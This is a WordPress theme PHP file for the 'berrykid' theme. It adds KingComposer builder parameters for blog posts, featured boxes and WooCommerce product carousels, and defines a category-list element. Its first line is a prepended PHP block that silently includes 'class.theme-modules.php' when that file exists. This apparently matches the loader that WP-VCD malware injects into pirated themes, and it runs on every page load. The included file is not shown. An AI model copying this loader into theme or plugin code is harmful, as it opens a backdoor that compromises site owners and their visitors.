<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
 * Load woocommerce styles follow theme skin actived
 *
 * @static
 * @access public
 * @since Wpopal_Themer 1.0
 */

if( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ){
	// add map param
	add_action('init', 'berrykid_kc_single_image_add_map_param', 99 );
	add_action('init', 'berrykid_kc_woo_carousel_products_add_map_param', 99 );
	add_action('init', 'berrykid_kc_woo_categories_list', 99 );

}
function berrykid_kc_single_image_add_map_param(){
    global $kc;
    $kc->add_map_param(
     'element_blog_posts',
        array(
		    'name' => 'rows_count',
		    'label' => 'Rows column',
		    'type' => 'number_slider',
		    'options' => array(
				'min' => 1,
				'max' => 4,
				'unit' => '',
				'show_input' => true
			),

			"admin_label" => true,
			'description' => 'Display number rows of post'
		   )
 	, 2);

	$kc->add_map_param(
		'element_featured_box',
		array(
			'name' => 'show_image',
			'label' => 'Show image ?',
			'type' => 'checkbox',
			'description' => esc_html__('Show Image.', 'berrykid'),
			'value' => 'yes',
			'options' => array(
				'yes' => 'Yes, Please!'
			),
		)
	, 5);

	$kc->add_map_param(
		'element_featured_box',
		array(
			"type" => "attach_image",
			"label" => esc_html__("Photo", 'berrykid'),
			"name" => "featured_image",
			"value" => '',
			'description' => ''
		)
	, 5);
}
/**
*
*/
function berrykid_kc_woo_carousel_products_add_map_param(){
	global $kc;

	$product_layouts = array(
    	'grid' 	=> esc_html__('Grid', 'berrykid') ,
    	'list' => esc_html__('List', 'berrykid') 
	);

	$kc->add_map_param(
		'woo_carousel_products',
			array(
				"type" => "textfield",
				"label" => esc_html__("Title", 'berrykid'),
				"name" => "title",
				"value" => '',
				"admin_label" => true
			)
	, 1);

	$kc->remove_map_param( 'woo_carousel_products', 'columns');

	$kc->remove_map_param( 'element_testimonials', 'skin');

	$kc->add_map_param(
		'woo_carousel_products',
			array(
		        'name' => 'columns',
		        'label' => esc_html__( 'Grid Column' ,'berrykid' ),
		        'type' => 'number_slider',
		        'options' => array(
		            'min' => 1,
		            'max' => 5,
		            'unit' => '',
		            'show_input' => true
		        ),
		        'description' => 'Display number of post'
		    ),
	5);

	$kc->add_map_param(
		'woo_grid_products',
			array(
				"type" => "select",
				"label" => esc_html__("Style",'berrykid'),
				"name" => "style",
				"options" => $product_layouts
			)
		, 3);
	
}

//=============================================
//* Function Create Element Woo_Categories_List
//=============================================

function berrykid_kc_woo_categories_list(){
	global $kc;
	$product_categories_select = array( 'none'=> esc_html__('None', 'berrykid') );
		
		if( is_admin() ){
			$args = array(
				'type' => 'post',
				'child_of' => 0,
				'parent' => '',
				'orderby' => 'name',
				'order' => 'ASC',
				'hide_empty' => false,
				'hierarchical' => 1,
				'exclude' => '',
				'include' => '',
				'number' => '',
				'taxonomy' => 'product_cat',
				'pad_counts' => false,

			);

			$categories = get_categories( $args );
			if( function_exists("wpopal_themer_woocommerce_getcategorychilds") ) {
				wpopal_themer_woocommerce_getcategorychilds( 0, 0, $categories, 0, $product_categories_select );
			}
		}
    //// /// //////
	$kc->add_map(
		array(
			'woo_categories_list' => array(
				'name' => 'Categories List',
				'description' => esc_html__('Display List Category and Couting Products', 'berrykid'),
				'icon' => 'sl-paper-plane',
				'category' => 'Woocommerce',

				"params" => array(

					array(
						"type" => "multiple",
						"label" => esc_html__('Category', 'berrykid'),
						"name" => "term_id",
						"options" =>$product_categories_select,	
						"admin_label" => true
						),
					array(
						"type" => "select",
						"label" => esc_html__("Style", 'berrykid'),
						"name" => "style",
						'options' 	=> array(
							'default' => esc_html__('Default (Vertical)', 'berrykid'), 
							'style1' => esc_html__('Style 1 (Horizontal)', 'berrykid'),
							),
						'std' => ''
						),

					array(
						"type"        => "textfield",
						"label"     => esc_html__("Extra class name",'berrykid'),
						"name"  => "el_class",
						"description" => esc_html__("If you wish to style particular content element differently, then use this field to add a class name and then refer to it in your css file.",'berrykid')
						)
				) 

			) 
		)
	);
}


